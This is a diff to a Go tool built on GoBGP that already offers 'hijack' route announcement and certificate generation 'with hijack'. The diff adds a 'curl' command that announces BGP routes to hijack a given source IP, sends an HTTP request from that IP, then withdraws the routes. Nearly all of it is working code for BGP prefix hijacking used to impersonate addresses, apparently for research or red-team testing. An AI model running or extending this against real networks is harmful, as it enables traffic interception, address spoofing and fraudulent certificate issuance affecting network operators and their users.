@@ -10,6 +10,7 @@ import (
 	"fmt"
 	"log"
 	"net"
+	neturl "net/url"
 	"os"
 	"os/exec"
 	"os/signal"
@@ -40,6 +41,7 @@ type Config struct {
 	Communities                     []string `json:"communities"`                     // List of communities (standard or large)
 	Time                            int      `json:"time"`                            // Time in seconds to wait after hijacking
 	TimeBeforeGeneratingCertificate int      `json:"timeBeforeGeneratingCertificate"` // Time in seconds to wait before generating certificate
+	TimeBeforeExecutingCurl         int      `json:"timeBeforeExecutingCurl"`         // Time in seconds to wait before executing curl
 	IphelperGatewayV4               string   `json:"iphelperGatewayV4"`               // IPv4 Gateway IP for iphelper command
 	IphelperGatewayV6               string   `json:"iphelperGatewayV6"`               // IPv6 Gateway IP for iphelper command
 	CADirURL                        string   `json:"caDirUrl"`                        // ACME CA directory URL
@@ -669,6 +671,74 @@ func generateCertificateWithHijack(client api.GobgpApiClient, ctx context.Contex
 	return nil
 }
 
+func curlWithHijack(client api.GobgpApiClient, ctx context.Context, sourceIP string, url string, dryrun bool, curlArgs ...string) error {
+	// Check if curlArgs contains --interface
+	for _, arg := range curlArgs {
+		if arg == "--interface" {
+			return fmt.Errorf("curlArgs contains --interface, which is not allowed")
+		}
+	}
+
+	// Check the url is valid
+	if _, err := neturl.Parse(url); err != nil {
+		return fmt.Errorf("invalid URL: %v", err)
+	}
+
+	// Validate source IP
+	ip := net.ParseIP(sourceIP)
+	if ip == nil {
+		return fmt.Errorf("invalid source IP address: %s", sourceIP)
+	}
+
+	// Run IP helper for the source IP
+	if err := iphelper(sourceIP, false); err != nil {
+		return fmt.Errorf("failed to run iphelper for %s: %v", sourceIP, err)
+	}
+
+	// hijack routes for the source IP
+	if err := hijackRoutes(client, ctx, sourceIP, dryrun); err != nil {
+		return fmt.Errorf("failed to hijack routes for %s: %v", sourceIP, err)
+	}
+
+	// Wait for the configured time before making curl request
+	if config.TimeBeforeExecutingCurl > 0 {
+		fmt.Printf("[INFO] Waiting for %d seconds before making curl request...\n", config.TimeBeforeExecutingCurl)
+		time.Sleep(time.Duration(config.TimeBeforeExecutingCurl) * time.Second)
+		fmt.Println("[INFO] Wait completed")
+	}
+
+	// Execute curl command
+	if !dryrun {
+		args := append([]string{"--interface", sourceIP, url}, curlArgs...)
+		cmd := exec.Command("curl", args...)
+		cmd.Stdout = os.Stdout
+		cmd.Stderr = os.Stderr
+		if err := cmd.Run(); err != nil {
+			return fmt.Errorf("failed to execute curl: %v", err)
+		}
+		fmt.Printf("[DEBUG] Would execute curl command from %s to %s with args: %v\n", sourceIP, url, curlArgs)
+	}
+
+	// If it is a dryrun, we don't need to clear routes
+	if dryrun {
+		fmt.Println("[DRYRUN] Would clear routes")
+		return nil
+	}
+
+	// Clear all routes at once
+	if err := clearRoutes(client, ctx); err != nil {
+		return fmt.Errorf("failed to clear routes: %v", err)
+	}
+
+	// Run IP helper delete for the source IP
+	if err := iphelper(sourceIP, true); err != nil {
+		return fmt.Errorf("failed to run iphelper delete for %s: %v", sourceIP, err)
+	}
+
+	fmt.Println("Hijacked successfully")
+	return nil
+}
+
 func iphelper(ip string, isDelete bool) error {
 	// Parse the IP address to determine if it's IPv4 or IPv6
 	parsedIP := net.ParseIP(ip)
@@ -839,7 +909,7 @@ func main() {
 	}()
 
 	if len(os.Args) < 2 {
-		log.Fatal("Usage: go run main.go <command>\nCommands:\n  clear   - Clear all routes\n  hijack <ip> [--dryrun]  - Add hijack route for specified IP\n  certgen <domain> [--dryrun] [--ip <ip1,ip2,...>] - Generate certificate for specified domain\n  iphelper <ip> [-d] - Add or remove IP helper route")
+		log.Fatal("Usage: go run main.go <command>\nCommands:\n  clear   - Clear all routes\n  hijack <ip> [--dryrun]  - Add hijack route for specified IP\n  certgen <domain> [--dryrun] [--ip <ip1,ip2,...>] - Generate certificate for specified domain\n  curl <source_ip> <url> [--dryrun] [curl arguments...] - Make curl request from source IP to URL\n  iphelper <ip> [-d] - Add or remove IP helper route")
 	}
 
 	switch os.Args[1] {
@@ -902,6 +972,28 @@ func main() {
 			log.Fatalf("Failed to generate certificate: %v", err)
 		}
 
+	case "curl":
+		if len(os.Args) < 4 {
+			log.Fatal("Usage: go run main.go curl <source_ip> <url> [--dryrun] [curl arguments...]")
+		}
+		sourceIP := os.Args[2]
+		url := os.Args[3]
+		dryrun := false
+		var curlArgs []string
+
+		// Parse remaining arguments
+		for i := 4; i < len(os.Args); i++ {
+			if os.Args[i] == "--dryrun" {
+				dryrun = true
+			} else {
+				curlArgs = append(curlArgs, os.Args[i])
+			}
+		}
+
+		if err := curlWithHijack(client, ctx, sourceIP, url, dryrun, curlArgs...); err != nil {
+			log.Fatalf("Failed to make curl request: %v", err)
+		}
+
 	case "iphelper":
 		if len(os.Args) < 3 {
 			log.Fatal("Usage: go run main.go iphelper <ip> [-d]")
@@ -927,6 +1019,6 @@ func main() {
 		}
 
 	default:
-		log.Fatal("Unknown command. Available commands: clear, hijack <ip> [--dryrun], certgen <domain> [--dryrun] [--ip <ip1,ip2,...>], iphelper <ip> [-d]")
+		log.Fatal("Unknown command. Available commands: clear, hijack <ip> [--dryrun], certgen <domain> [--dryrun] [--ip <ip1,ip2,...>], curl <source_ip> <url> [--dryrun] [curl arguments...], iphelper <ip> [-d]")
 	}
 }
